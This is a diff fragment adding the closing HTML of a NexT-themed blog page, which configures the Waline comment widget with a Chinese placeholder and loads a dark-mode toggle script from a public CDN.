+<script class="next-config" data-name="waline" type="application/json">{"lang":"zh-cn","enable":true,"serverURL":"https://blog-api-25jf3kruh-fz1lin.vercel.app/","placeholder":"靓仔，来评论呀","avatar":"mm","pageSize":10,"visitor":false,"comment_count":true,"requiredFields":[],"meta":["nick","mail","link"],"requiredMeta":[],"libUrl":"https://cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js","el":"#waline-comments","path":"/2022/429639226/"}</script>
+<script>
+document.addEventListener('page:loaded', () => {
+  NexT.utils.loadComments(CONFIG.waline.el).then(() => 
+    NexT.utils.getScript(CONFIG.waline.libUrl, { condition: window.Waline })
+  ).then(() => {
+    new Waline(CONFIG.waline);
+  });
+});
+</script><script src="https://cdn.jsdelivr.net/npm/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>
+
+<script>
+var options = {
+  bottom: '64px',
+  right: 'unset',
+  left: '32px',
+  time: '0.5s',
+  mixColor: 'transparent',
+  backgroundColor: 'transparent',
+  buttonColorDark: '#100f2c',
+  buttonColorLight: '#fff',
+  saveInCookies: true,
+  label: '🌓',
+  autoMatchOsTheme: true
+}
+const darkmode = new Darkmode(options);
+window.darkmode = darkmode;
+darkmode.showWidget();
+</script>
+
+</body>
+</html>
